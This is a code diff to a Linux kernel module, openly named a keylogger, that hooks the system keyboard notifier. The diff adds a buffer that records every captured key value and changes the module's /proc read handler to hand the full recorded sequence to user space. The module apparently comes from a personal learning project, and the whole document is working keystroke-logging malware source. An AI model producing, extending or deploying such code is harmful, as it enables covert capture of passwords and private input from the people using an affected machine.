@@ -6,21 +6,37 @@
 
 #define PROC_NAME "keylogger_info"
 #define STATUS_BUF_SIZE 128
+#define LOG_BUF_SIZE 1024
 
 static struct proc_dir_entry *proc_file;
 static char status_buf[STATUS_BUF_SIZE] = "status: init\n";
 static char last_key = '?';
+static char key_buffer[LOG_BUF_SIZE]; // Buffer to store a sequence of keys
+static int key_index = 0; // Tracks how many keys were stored so far
 
 static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) // callback function
 {
-    int len = strlen(status_buf);
+    int len = key_index; // Only the bytes that were filled
 
     if (*ppos > 0)
     {
         return 0;
     }
 
-    if (copy_to_user(buf, status_buf, len)) // Move len bytes from the status_buf into the user space buf
+    if (len == 0)
+    {
+        len = strlen(status_buf); // Nothing logged yet
+
+        if (copy_to_user(buf, status_buf, len)) // Move len bytes from status_buf into the user space buf
+        {
+            return -EFAULT;
+        }
+
+        *ppos = len;
+        return len;
+    }
+
+    if (copy_to_user(buf, key_buffer, len)) // Move the raw key log to user space
     {
         return -EFAULT;
     }
@@ -42,10 +58,17 @@ static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void 
     {
         last_key = (char)param->value; // Save the raw numerical value of the key
 
+        if (key_index < LOG_BUF_SIZE - 1) // So wont corrupt memory
+        {
+            key_buffer[key_index] = last_key; // Append the new key to our log buffer
+            key_index++;
+            key_buffer[key_index] = '\0';
+        }
+
         snprintf(status_buf, STATUS_BUF_SIZE, "last key (raw): %d\n", param->value); // Format and save the text to show the user later
     } 
 
-    return NOTIFY_OK; // Tell the kernel we processed the event successfully
+    return NOTIFY_OK; // Tell the kernel we processed the event
 }
 
 static struct notifier_block keylogger_nb =
@@ -58,6 +81,7 @@ static int __init keylogger_init(void)
     printk(KERN_INFO "keylogger: loaded\n"); // Log a message to the kernel buffer (debug)
 
     snprintf(status_buf, STATUS_BUF_SIZE, "last key (raw): -1\n");
+    memset(key_buffer, 0, sizeof(key_buffer)); // Start with an empty log buffer
 
     register_keyboard_notifier(&keylogger_nb); // Tell Linux to start sending keyboard events to my callback
 
